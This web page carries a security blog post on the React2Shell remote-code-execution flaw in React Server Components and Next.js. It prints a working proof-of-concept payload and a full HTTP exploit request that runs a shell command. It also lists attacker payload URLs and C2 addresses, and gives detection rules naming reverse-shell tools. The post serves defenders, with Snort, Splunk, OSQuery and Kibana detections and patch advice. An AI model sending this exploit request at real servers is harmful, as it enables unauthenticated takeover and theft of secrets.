<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown | Vyshak Haridasan</title>
<meta name="keywords" content="CVE-2025-55182, React2Shell, TryHackMe, RCE, Insecure_Deserialization">
<meta name="description" content="This blog breaks down how the React2Shell vulnerability (CVE-2025-55182) abuses insecure deserialization in React Server Components’ Flight protocol to achieve pre-authentication remote code execution, and provides detection, mitigation, and threat-hunting guidance for defenders.">
<meta name="author" content="Vyshak Haridasan">
<link rel="canonical" href="http://localhost:1313/posts/react2shell/">
<link crossorigin="anonymous" href="http://localhost:1313/assets/css/stylesheet.css" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/react2shell/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-M8JBGS6ZKT"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-M8JBGS6ZKT');
</script><meta property="og:url" content="http://localhost:1313/posts/react2shell/">
  <meta property="og:site_name" content="Vyshak Haridasan">
  <meta property="og:title" content="How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown">
  <meta property="og:description" content="This blog breaks down how the React2Shell vulnerability (CVE-2025-55182) abuses insecure deserialization in React Server Components’ Flight protocol to achieve pre-authentication remote code execution, and provides detection, mitigation, and threat-hunting guidance for defenders.">
  <meta property="og:locale" content="en-us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2026-01-09T00:00:00+00:00">
    <meta property="article:modified_time" content="2026-01-09T00:00:00+00:00">
    <meta property="article:tag" content="CVE-2025-55182">
    <meta property="article:tag" content="React2Shell">
    <meta property="article:tag" content="TryHackMe">
    <meta property="article:tag" content="RCE">
    <meta property="article:tag" content="Insecure_Deserialization">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown">
<meta name="twitter:description" content="This blog breaks down how the React2Shell vulnerability (CVE-2025-55182) abuses insecure deserialization in React Server Components’ Flight protocol to achieve pre-authentication remote code execution, and provides detection, mitigation, and threat-hunting guidance for defenders.">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown",
      "item": "http://localhost:1313/posts/react2shell/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown",
  "name": "How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown",
  "description": "This blog breaks down how the React2Shell vulnerability (CVE-2025-55182) abuses insecure deserialization in React Server Components’ Flight protocol to achieve pre-authentication remote code execution, and provides detection, mitigation, and threat-hunting guidance for defenders.",
  "keywords": [
    "CVE-2025-55182", "React2Shell", "TryHackMe", "RCE", "Insecure_Deserialization"
  ],
  "articleBody": "Introduction In this article, we take a detailed look at CVE-2025-55182, a critical vulnerability revealed in December 2025 that immediately drew attention across the security community. Classified with the maximum CVSS score of 10.0, this flaw represents a complete breakdown of trust boundaries within applications built using React Server Components (RSC).\nFrameworks that rely heavily on RSC—most notably Next.js—are directly exposed to this issue. The vulnerability was informally named “React2Shell” by the researchers who uncovered it, highlighting the severity of the attack path. With minimal interaction and no authentication required, a remote attacker can trigger arbitrary code execution on the server by sending a single malicious HTTP request.\nThis exploit essentially turns a feature intended for high-performance server-side rendering into a direct entry point for full system compromise, making it one of the most dangerous web vulnerabilities discovered in recent years.\nReact Server Components and the React Flight Protocol To fully understand how the React2Shell vulnerability works, it’s important to grasp the fundamentals of React Server Components (RSC) and the React Flight communication protocol. RSC, introduced in React 19, shifts part of the rendering workload from the browser to the server. Instead of sending raw JavaScript to the client, the server performs the heavy computation and returns a pre-processed component tree. This design improves performance, reduces bundle sizes, and allows the client to stay lightweight.\nTo support this architecture, React relies on a low-level data exchange format known as the Flight Protocol. The Flight Protocol defines how the server serialises component output and how the client deserialises it back into a usable structure. When the browser needs the server to run a “Server Action”—a function that executes only on the server—it sends a specially encoded payload. This payload contains references and type markers that React uses to reconstruct component data.\nReact Flight uses unique markers in its serialisation format, such as:\n$@ → chunk reference $B → Blob reference $1:constructor:constructor → property path references using colon-separated accessors These markers allow React to efficiently reference modules, functions, and objects without shipping entire definitions over the network. However, this is also where the core of the vulnerability emerges.\nWhere the Vulnerability Appears The vulnerable versions of React Server Components fail to properly validate these incoming references. The server assumes that the client will only send legitimate references to exported modules. Instead, an attacker can craft a malicious payload containing forged serialisation markers that point to internal JavaScript properties or object constructors that should never be exposed.\nBecause the server blindly trusts these references:\nArbitrary object paths can be accessed Prototype chains can be polluted Malicious data structures can be instantiated Server-side execution can be redirected to attacker-controlled values This behaviour allows hostile clients to forge a payload that React treats as valid—ultimately enabling prototype pollution and, in affected frameworks such as Next.js, full remote code execution.\nWhy This Vulnerability Is So Dangerous Several factors contribute to the severity of React2Shell (CVE-2025-55182):\nVulnerable by default — no misconfiguration or custom code is required Single-request exploitation — only one HTTP request is needed Pre-authentication attack — the attacker doesn’t need to log in Highly reliable PoCs — exploit scripts work consistently Affects the entire RSC ecosystem — including popular frameworks like Next.js Because React Server Components sit at the core of server-side rendering in modern React apps, compromising them effectively gives an attacker direct access to backend execution paths.\nInsecure Deserialization and How It Affects React Server Components At the heart of the React2Shell vulnerability lies a classic security flaw: Insecure Deserialization. In typical server-side applications, deserialization occurs when structured data—JSON, binary formats, or custom protocols—is converted back into in-memory objects. If this process does not include strict validation, attackers can craft malicious payloads that the system interprets as trusted data, potentially leading to code execution, data manipulation, or full system compromise.\nReact Server Components (RSC) introduce a unique form of deserialization through the Flight Protocol, which interprets special markers and data structures to reconstruct server-side resources requested by the client. This makes RSC heavily reliant on safe deserialization practices. Unfortunately, CVE-2025-55182 exposes how fragile this mechanism can be when not validated properly.\nHow Deserialization Works in RSC CVE-2025-55182 is fundamentally an Insecure deserialization vulnerability in how React Server Components handle incoming Flight protocol payloads. The vulnerability exists in the requireModule function within the react-server-dom-webpack package. Let’s examine the problematic code pattern:\n1 2 3 4 5 function requireModule(metadata) { var moduleExports = __webpack_require__(metadata[0]); // ... additional logic ... return moduleExports[metadata[2]]; // VULNERABLE LINE } The critical flaw is in the bracket notation access moduleExports[metadata[2]]. In JavaScript, when we access a property using bracket notation, the engine doesn’t just check the object’s own properties—it traverses the entire prototype chain. This means an attacker can reference properties that weren’t explicitly exported by the module.\nMost importantly, every JavaScript function has a constructor property that points to the Function constructor. By accessing someFunction.constructor, an attacker obtains a reference to the global Function constructor, which can execute arbitrary JavaScript code when invoked with a string argument.\nThe vulnerability becomes exploitable because React’s Flight protocol allows clients to specify these property paths through the colon-separated reference syntax. An attacker can craft a reference like $1:constructor:constructor which traverses:\nGet chunk/module 1 Access its .constructor property (gets the Function constructor) Access .constructor again (still the Function constructor, but confirms the chain). Affected Versions \u0026 Components The vulnerability is present in versions 19.0, 19.1.0, 19.1.1, and 19.2.0 of:\nreact-server-dom-webpack react-server-dom-parcel react-server-dom-turbopack Some React frameworks and bundlers depended on, had peer dependencies for, or included the vulnerable React packages. The following React frameworks \u0026 bundlers are affected: next, react-router, waku, @parcel/rsc, @vitejs/plugin-rsc, and rwsdk.\nSee the update instructions for how to upgrade to these patches.\nAttack Surface Mapping To exploit CVE-2025-55182, an attacker sends a crafted input to a web application running React Server Components functions in the form of a POST request. This input is then processed as a serialized object and passed to the backend server, where it is deserialized. Due to the default trust among the components, the attacker-provided input is then deserialized and the backend runs attacker-provided code under the NodeJS runtime.\n![[Pasted image 20260109133545.png]]\nPost-exploitation, attackers were observed to run arbitrary commands, such as reverse shells to known Cobalt Strike servers. To achieve persistence, attackers added new malicious users, utilized remote monitoring and management (RMM) tools such as MeshAgent, modified authorized_keys file, and enabled root login. To evade security defenses, the attackers downloaded from attacker-controlled CloudFlare Tunnel endpoints (for example, *.trycloudflare.com) and used bind mounts to hide malicious processes and artifacts from system monitoring tools.\nThe malware payloads seen in campaigns investigated by Microsoft Defender vary from remote access trojans (RATs) like VShell and EtherRAT, the SNOWLIGHT memory-based malware downloader that enabled attackers to deploy more payloads to target environments, ShadowPAD, and XMRig cryptominers. The attacks proceeded by enumerating system details and environment variables to enable lateral movement and credential theft.\nCredentials that were observed to be targeted included Azure Instance Metadata Service (IMDS) endpoints for Azure, Amazon Web Services (AWS), Google Cloud Platform (GCP), and Tencent Cloud to acquire identity tokens, which could be used to move laterally to other cloud resources. Attackers also deployed secret discovery tools such as TruffleHog and Gitleaks, along with custom scripts to extract several different secrets. Attempts to harvest AI and cloud-native credentials, such as OpenAI API keys, Databricks tokens, and Kubernetes service‑account credentials were also observed. Azure Command-Line Interface (CLI) (az) and Azure Developer CLI (azd) were also used to obtain tokens.\nProof of Concept (PoC) Breakdown Now let’s dissect how maple3142’s proof-of-concept achieves remote code execution. The exploit cleverly chains together multiple JavaScript engine behaviours to transform a deserialization bug into arbitrary code execution.\nStage 1: Creating a Fake Chunk Object\nThe exploit begins by sending a multipart form request with three fields. The first field contains a carefully crafted fake chunk object:\n1 2 3 4 5 6 7 8 9 10 11 12 13 { \"then\": \"$1:__proto__:then\", \"status\": \"resolved_model\", \"reason\": -1, \"value\": \"{\\\\\\\\\"then\\\\\\\\\":\\\\\\\\\"$B1337\\\\\\\\\"}\", \"_response\": { \"_prefix\": \"process.mainModule.require('child_process').execSync('xcalc');\", \"_chunks\": \"$Q2\", \"_formData\": { \"get\": \"$1:constructor:constructor\" } } } This object mimics React’s internal Chunk class structure. By setting then to reference Chunk.prototype.then, we’re creating a self-referential structure. When React processes this and awaits the chunk, it invokes the then method with the fake chunk as the context (this).\nStage 2: Exploiting the Blob Deserialization Handler\nThe second critical component is the $B handler reference ($B1337). In React’s Flight protocol, the $B prefix indicates a Blob reference. When React processes a Blob reference, it calls a function that internally uses response._formData.get(response._prefix + id).\nHere’s where the exploitation becomes elegant: we’ve polluted the _response object with our malicious properties. When the Blob handler executes:\n1 response._formData.get(response._prefix + id) It actually executes:\n1 Function(\"process.mainModule.require('child_process').execSync('xcalc');1337\") Let’s break down why: we’ve set _formData.get to point to $1:constructor:constructor, which resolves to the Function constructor. The _prefix contains our malicious code. When these are combined, the Function constructor is invoked with our code as a string argument, creating and implicitly executing a function containing our arbitrary JavaScript.\nStage 3: Achieving Code Execution\nThe payload process.mainModule.require('child_process').execSync('xcalc') demonstrates the power of this exploit. We’re using Node.js’s module system to:\nAccess process.mainModule (the main module being executed) Use its require method to load the child_process module Call execSync to execute an operating system command In this case, launching the calculator application (xcalc) as proof of exploitation This could easily be modified to establish a reverse shell, exfiltrate environment variables containing secrets, read sensitive files, or perform any operation the Node.js process has permissions to execute.\nLet’s examine the complete HTTP request from maple3142’s PoC:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 POST / HTTP/1.1 Host: localhost Next-Action: x Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=\"0\" {\"then\":\"$1:__proto__:then\",\"status\":\"resolved_model\",\"reason\":-1,\"value\":\"{\\\\\\\\\"then\\\\\\\\\":\\\\\\\\\"$B1337\\\\\\\\\"}\",\"_response\":{\"_prefix\":\"process.mainModule.require('child_process').execSync('xcalc');\",\"_chunks\":\"$Q2\",\"_formData\":{\"get\":\"$1:constructor:constructor\"}}} ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=\"1\" \"$@0\" ------WebKitFormBoundaryx8jO2oVc6SWP3Sad Content-Disposition: form-data; name=\"2\" [] ------WebKitFormBoundaryx8jO2oVc6SWP3Sad-- The Next-Action: x header triggers React’s Server Action processing. The multipart body contains three parts:\nField 0: The fake chunk object with our malicious _response structure Field 1: A reference $@0 that points back to field 0, creating the self-reference Field 2: An empty array, completing the required structure When the server processes this request, it deserialises field 0, encounters the $@0 reference in field 1, establishes the self-referential then property, and subsequently triggers the Blob handler, which executes our code through the Function constructor.\nDetection \u0026 Monitoring This portion of the blog will provide various detection mechanisms for recognizing React2Shell within your network and environment.\nFortunately for us defenders, this specific vulnerability requires interacting within React \u0026 React Server Components (RCS) within a specific format and structure. Regular user browsing activity will not have specific headers and values within their HTTP(S) request that is required for exploiting this vulnerability.\nFor example, the Next-Action and multipart/form-data are an incredibly specific query and payload for the React Server Component Flight protocol. We will almost never see a regular/legitimate user providing this within their query, and the payload for the vulnerability must have certain elements:\nNext-Action header. multipart/form-data. Elements within form-data with elements such as \"status\": \"reserved_model\" within the payload. For reference, detecting the presence of \"then\":\"$1:__proto__:then\" within the payload is an extremely good indicator that React Server Components are being used. This should almost never be seen externally, but rather, within the application itself at a push. Due to how exploitation of this vulnerability works, we can expect a certain pattern within the HTTP(S) request. Therefore, for monitoring and detection, rather than specifically inspecting the payload, we can rather monitor the format of the request.\nSnort (v3) To detect this vulnerability using Snort, we can use the following rule:\n1 2 3 4 5 6 7 8 9 10 11 12 alert http any any -\u003e $LAN_NETWORK any ( msg:\"Potential Next.js React2Shell / CVE-2025-66478 attempt\"; flow:to_server,established; content:\"Next-Action\"; http_header; nocase; content:\"multipart/form-data\"; http_header; nocase; pcre:\"/Content-Disposition:\\\\s*form-data;\\\\s*name=\\\\\"0\\\\\"/s\"; pcre:\"/\\\\\"status\\\\\"\\\\s*:\\\\s*\\\\\"resolved_model\\\\\"/s\"; pcre:\"/\\\\\"then\\\\\"\\\\s*:\\\\s*\\\\\"\\\\$1:__proto__:then\\\\\"/s\"; classtype:web-application-attack sid:6655001; rev:1; ) At a summary, this snort rule:\nListens for specific headers within the request, that aren’t usually generated by regular user traffic. Detects multipart/form-data where RSCs do not regularly use. Payloads for this vulnerability need to follow a certain specification for the exploit to be processed - we can detect this. For example, the name=\"0\" element. OSQuery We can use the following OSQuery rule to detect vulnerable versions of React Server Components within an endpoint or anything within the CI/CD build process:\n1 2 3 4 5 6 7 8 9 10 11 { \"queries\": { \"detect_rev2shell_react_server_components\": { \"query\": \"SELECT name, version, path FROM npm_packages WHERE (name='react-server-dom-parcel' AND (version='19.0.0' OR (version \u003e= '19.1.0' AND version \u003c '19.1.2') OR version='19.2.0')) OR (name='react-server-dom-turbopack' AND (version='19.0.0' OR (version \u003e= '19.1.0' AND version \u003c '19.1.2') OR version='19.2.0')) OR (name='react-server-dom-webpack' AND (version='19.0.0' OR (version \u003e= '19.1.0' AND version \u003c '19.1.2') OR version='19.2.0'));\", \"interval\": 3600, \"description\": \"Detects vulnerable versions of React Server Components packages (react-server-dom-*) affected by CVE-2025-55182 / CVE-2025-66478 / React2Shell.\", \"platform\": \"linux,windows,macos\", \"version\": \"1.0\" } } } At a summary, this OSQuery rule:\nDetects if vulnerable packages are used within an endpoint: react-server-dom-parcel, react-server-dom-turbopack, react-server-dom-webpack. If present, checks the installed versions of these packages compared to vulnerable versions (I.e. 19.0.0, \u003e= 19.1.0 / 19.2.0). The benefit of this OSQuery rule is that we can search and determine for vulnerable versions across endpoints, rather hosted, or as part of the build or development process, before it even reaches production.\nSplunk This Splunk query identifies suspicious child processes spawned from Node.js or Next.js processes—such as server components or development servers—to detect possible React2Shell exploitation. It looks for high-risk binaries (curl, wget, bash, python, nc, socat, etc.) or shell-like behavior executed by Node-based processes, which would indicate an attacker has achieved remote code execution. The search correlates process activity, timestamps, parent/child relationships, and command patterns to highlight anomalous or malicious behavior originating from React Server Component workflows.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 | tstats `security_content_summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name = \"node\" Processes.parent_process IN ( \"*--experimental-https*\", \"*--experimental-next-config-strip-types*\", \"*/node_modules/next*\", \"*next dev*\", \"*next start*\", \"*node_modules/.bin*\", \"*react-scripts start*\", \"*start-server.js*\" ) AND ( Processes.process_name IN ( \"awk\", \"gawk\", \"ifconfig\", \"lua\", \"nc\", \"ncat\", \"netcat\", \"openssl\", \"perl\", \"php\", \"python\", \"python2\", \"python3\", \"ruby\", \"socat\", \"telnet\" ) OR ( Processes.process_name IN (\"curl\", \"wget\") Processes.process = \"* |*\" ) OR ( Processes.process_name IN ( \"bash\", \"dash\", \"sh\" ) NOT Processes.process = \"*-c*\" ) OR ( Processes.process_name IN ( \"bash\", \"dash\", \"ksh\", \"sh\", \"zsh\" ) Processes.process IN ( \"*/dev/tcp/*\", \"*/dev/udp/*\", \"*0\u003e\u00261*\", \"*curl*\", \"*exec *\u003e\u0026*\", \"*fsockopen*\", \"*ifconfig*\", \"*mkfifo*\", \"*nc *\", \"*ncat*\", \"*netcat*\", \"*proc_open*\", \"*s_client*\", \"*socat*\", \"*socket*\", \"*subprocess*\", \"*TCPSocket*\", \"*wget*\" ) ) ) by Processes.action Processes.dest Processes.original_file_name Processes.parent_process Processes.parent_process_exec Processes.parent_process_guid Processes.parent_process_id Processes.parent_process_name Processes.parent_process_path Processes.process Processes.process_exec Processes.process_guid Processes.process_hash Processes.process_id Processes.process_integrity_level Processes.process_name Processes.process_path Processes.user Processes.user_id Processes.vendor_product | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` | `linux_suspicious_react_or_next_js_child_process_filter` Kibana This rule detects exploitation attempts targeting CVE-2025-55182, a critical remote code execution vulnerability in React’s Flight protocol used by Next.js and other RSC implementations. The vulnerability stems from insecure prototype chain traversal in the Flight deserializer, allowing attackers to access __proto__, constructor, and ultimately the Function constructor to execute arbitrary code.\nPossible investigation steps\nExamine the full HTTP request body to identify the specific attack payload and command being executed. Check the response body for E{\"digest\":\"...\"} patterns which contain command output from successful exploitation. Identify the target application and verify if it runs vulnerable React (\u003c 19.1.0) or Next.js (\u003c 15.3.2) versions. Review the source IP for other reconnaissance or exploitation attempts against web applications. Check for the Next-Action header which is required for the exploit to work. Correlate with process execution logs to identify if child processes (e.g., shell commands) were spawned by the Node.js process. False positive analysis\nLegitimate React Server Components traffic will NOT contain __proto__, constructor:constructor, or code execution patterns. Security scanning tools like react2shell-scanner may trigger this rule during authorized penetration testing. The combination of prototype pollution patterns with RSC-specific syntax is highly indicative of malicious activity. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 network where http.request.method == \"POST\" and ( // Successful CVE-2025-55182 RCE - command output in digest ( http.response.status_code in (500, 303) and http.response.body.content like~ \"*E{\\\\\"digest\\\\\"*\" and http.request.body.content regex~ \"\"\".*\\\\$[0-9]+:[a-zA-Z_0-9]+:[a-zA-Z_0-9]+.*\"\"\" ) or // Prototype pollution attempts in RSC Flight data (never legitimate) ( http.request.body.content regex~ \"\"\".*\\\\$[0-9]+:[a-zA-Z_0-9]+:[a-zA-Z_0-9]+.*\"\"\" and ( http.request.body.content like~ \"*__proto__*\" or http.request.body.content like~ \"*prototype*\" ) ) ) Indicators of compromise The list below is non-exhaustive and does not represent all indicators of compromise observed in the known campaigns:\nIndicator Type Description c6c7e7dd85c0578dd7cb24b012a665a9d5210cce8ff735635a45605c3af1f6adb568582240509227ff7e79b6dc73c933dcc3fae674e9244441066928b1ea056069f2789a539fc2867570f3bbb71102373a94c7153239599478af84b9c81f2a0368de36f14a7c9e9514533a347d7c6bc830369c7528e07af5c93e0bf7c1cd86df717c849a1331b63860cefa128a4aa5d476f300ac45fd5d3c56b2746f7e72a0d27909046e5e0fd60461b721c0ef7cfe5899f76672e4970d629bb51bb904a053987e0a0c48ee0f65c72a252335f6dcd435dbd448fc0414b295f635372e1c5a9171 SHA-256 Coin miner payload hashes b33d468641a0d3c897e571426804c65daae3ed939eab4126c3aa3fa8531de5e8f0b66629fe8ad71779df5e4126c389e7702f975049bd17cb597ebcf03c6b110b59630d8f3b4db5acbcaccc0cfa54500f2bbb0745d4b5c50d903636f120fc870082335954bec84cbdd019cfa474f20f4274310a1477e03e34af7c62d15096fe0df0d3d5668a4df347eb0a59df167acddb245f022a518a6d15e37614af0bbc2adf317e10c4068b661d3721adaa35a30728739defddbc72b841c3d06aca0abd4d5e0aad73947fb1876923709213333099b8c728dde9f5d86acfd0f3702a963bae6a9dde35ba8e132ebed29e70f57da0c4f36a9401a7bbd36e6ddd257e0920aa4083240afa3a6457f1ee866f6f03ff815009ff8fd7b70b902bc59b037ac54b6cae9b8e07beb854f77e90c174829bd4e01e86779d596710ad161dbc0e02a219d6227f244bf271d2e55cd737980322de37c2c2792154b4cf4e4893e9908c2819026e5f SHA-256 Backdoor payload hashes hxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.archxxp://194[.]69[.]203[.]32:81/hiddenbink/colonna.i686hxxp://194[.]69[.]203[.]32:81/hiddenbink/react.shhxxp://162[.]215[.]170[.]26:3000/sex.shhxxp://216[.]158[.]232[.]43:12000/sex.shhxxp://196[.]251[.]100[.]191/no_killer/Exodus.arm4hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86hxxp://196[.]251[.]100[.]191/no_killer/Exodus.x86_64hxxp://196[.]251[.]100[.]191/update.shhxxp://anywherehost[.]site/xms/k1.shhxxp://anywherehost[.]site/xms/kill2.shhxxps://overcome-pmc-conferencing-books[.]trycloudflare[.]com/p.pnghxxp://donaldjtrmp.anondns.net:1488/labubuhxxp://labubu[.]anondns[.]net:1488/donghxxp://krebsec[.]anondns[.]net:2316/donghxxps://hybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]com/agenthxxps://ghostbin[.]axel[.]org/paste/evwgo/rawhxxp://xpertclient[.]net:3000/sex.shhxxp://superminecraft[.]net[.]br:3000/sex.sh URLs Various payload download URLs 194.69.203[.]32162.215.170[.]26216.158.232[.]43196.251.100[.]19146.36.37[.]8592.246.87[.]48 IP addresses C2 anywherehost[.]sitexpertclient[.]netvps-zap812595-1[.]zap-srv[.]comsuperminecraft[.]net[.]brovercome-pmc-conferencing-books[.]trycloudflare[.]comdonaldjtrmp[.]anondns[.]netlabubu[.]anondns[.]netkrebsec[.]anondns[.]nethybird-accesskey-staging-saas[.]s3[.]dualstack[.]ap-northeast-1[.]amazonaws[.]comghostbin[.]axel[.]org Domains C2 Mitigation Strategies Patch immediately React and Next.js have released fixes for the impacted packages. Upgrade to one of the following patched versions (or later within the same release line): React: 19.0.1, 19.1.2, 19.2.1 Next.js: 5.0.5, 15.1.9, 15.2.6, 15.3.6, 15.4.8, 15.5.7, 16.0.7 Because many frameworks and bundlers rely on these packages, make sure your framework-level updates also pull in the corrected dependencies. Prioritize exposed services Patch all affected systems, starting with internet-facing workloads. Use Microsoft Defender Vulnerability Management (MDVM) to surface vulnerable package inventory and to track remediation progress across your estate. Monitor for exploit activity Review MDVM dashboards and Defender alerts for indicators of attempted exploitation. Correlate endpoint, container, and cloud signals for higher confidence triage. Invoke incident response process to address any related suspicious activity stemming from this vulnerability. Add WAF protections where appropriate Apply Azure Web Application Firewall (WAF) custom rules for Application Gateway and Application Gateway for Containers to help block exploit patterns while patching is in progress. Microsoft has published rule guidance and JSON examples in the Azure Network Security Blog, with ongoing updates as new attack permutations are identified. References and further reading TryHackMe Lab Official React Advisory Official React Advisory - Facebook Defending against the CVE-2025-55182 (React2Shell) vulnerability in React Server Components -MSRC https://www.youtube.com/watch?v=jwzeJU_62IQ https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http https://www.elastic.co/guide/en/security/current/react2shell-cve-2025-55182-exploitation-attempt.html https://research.splunk.com/endpoint/cda04e9c-1950-43ab-87d6-e333a3d7f107/ ",
  "wordCount" : "3070",
  "inLanguage": "en",
  "datePublished": "2026-01-09T00:00:00Z",
  "dateModified": "2026-01-09T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Vyshak Haridasan"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "http://localhost:1313/posts/react2shell/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "Vyshak Haridasan",
    "logo": {
      "@type": "ImageObject",
      "url": "http://localhost:1313/favicon.ico"
    }
  }
}
</script>
</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/" accesskey="h" title="Vyshak (Alt + H)">
                <img src="http://localhost:1313/images/logo.png" alt="" aria-label="logo"
                    height="35">Vyshak</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/posts/" title="Posts">
                    <span>Posts</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://vyshak.in/" title="About">
                    <span>About</span>&nbsp;
                    <svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round"
                        stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12">
                        <path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"></path>
                        <path d="M15 3h6v6"></path>
                        <path d="M10 14L21 3"></path>
                    </svg>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/posts/">Posts</a></div>
    <h1 class="post-title entry-hint-parent">
      How One HTTP Request Can Compromise Your Next.js App — React2Shell Breakdown
    </h1>
    <div class="post-meta"><span title='2026-01-09 00:00:00 +0000 UTC'>January 9, 2026</span>&nbsp;·&nbsp;<span>15 min</span>&nbsp;·&nbsp;<span>3070 words</span>&nbsp;·&nbsp;<span>Vyshak Haridasan</span>

</div>
  </header> 
  <div class="post-content"><h2 id="introduction"><strong>Introduction</strong><a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
